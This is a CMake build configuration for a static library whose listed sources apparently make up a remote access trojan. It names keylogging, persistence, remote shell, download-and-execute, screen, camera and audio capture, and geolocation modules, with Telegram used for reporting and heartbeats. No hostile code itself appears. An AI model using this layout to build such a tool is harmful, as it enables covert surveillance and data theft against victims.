# Platform-specific sources
set(PLATFORM_SOURCES "")
set(PLATFORM_LIBS "")

if(WIN32)
    list(APPEND PLATFORM_SOURCES
        keyboard/WindowsKeyListener.cpp
        keyboard/KeyResolver.cpp
        system/WindowsPersistence.cpp
        system/WindowsShellService.cpp
        system/WindowsSysInfoService.cpp
        system/WindowsClipboardService.cpp
        system/WindowsProcessService.cpp
        system/WindowsWifiService.cpp
        system/WindowsFileManagerService.cpp
        system/WindowsDownloadExecService.cpp
    )
    list(APPEND PLATFORM_LIBS user32 advapi32 kernel32 ws2_32 iphlpapi)
elseif(UNIX)
    list(APPEND PLATFORM_SOURCES
        keyboard/LinuxKeyListener.cpp
        system/LinuxPersistence.cpp
        system/ShellService.cpp
        media/LinuxScreenCapture.cpp
    )
endif()

add_library(nuub_infrastructure STATIC
    telegram/TelegramBot.cpp
    telegram/TelegramReporter.cpp
    telegram/HeartbeatService.cpp
    media/OpenCVMediaCapture.cpp
    network/IPGeolocationService.cpp
    network/WiFiGeolocationService.cpp
    system/ActivityLogger.cpp
    ${PLATFORM_SOURCES}
)

target_include_directories(nuub_infrastructure PUBLIC ${CMAKE_SOURCE_DIR}/src)

find_package(CURL REQUIRED)
find_package(nlohmann_json CONFIG REQUIRED)
find_package(OpenCV REQUIRED COMPONENTS core imgcodecs imgproc videoio)
find_package(SndFile REQUIRED)

target_link_libraries(nuub_infrastructure PUBLIC
    nuub_application
    CURL::libcurl
    nlohmann_json::nlohmann_json
    ${OpenCV_LIBS}
    SndFile::sndfile
)

# Platform-specific dependencies
if(WIN32)
    find_package(portaudio CONFIG REQUIRED)
    target_link_libraries(nuub_infrastructure PUBLIC portaudio::portaudio ${PLATFORM_LIBS})
elseif(UNIX)
    find_package(PkgConfig REQUIRED)
    pkg_check_modules(PORTAUDIO REQUIRED portaudio-2.0)
    target_link_libraries(nuub_infrastructure PUBLIC ${PORTAUDIO_LIBRARIES})
    target_include_directories(nuub_infrastructure PUBLIC ${PORTAUDIO_INCLUDE_DIRS})
    target_link_libraries(nuub_infrastructure PUBLIC ${PLATFORM_LIBS} pthread)
endif()
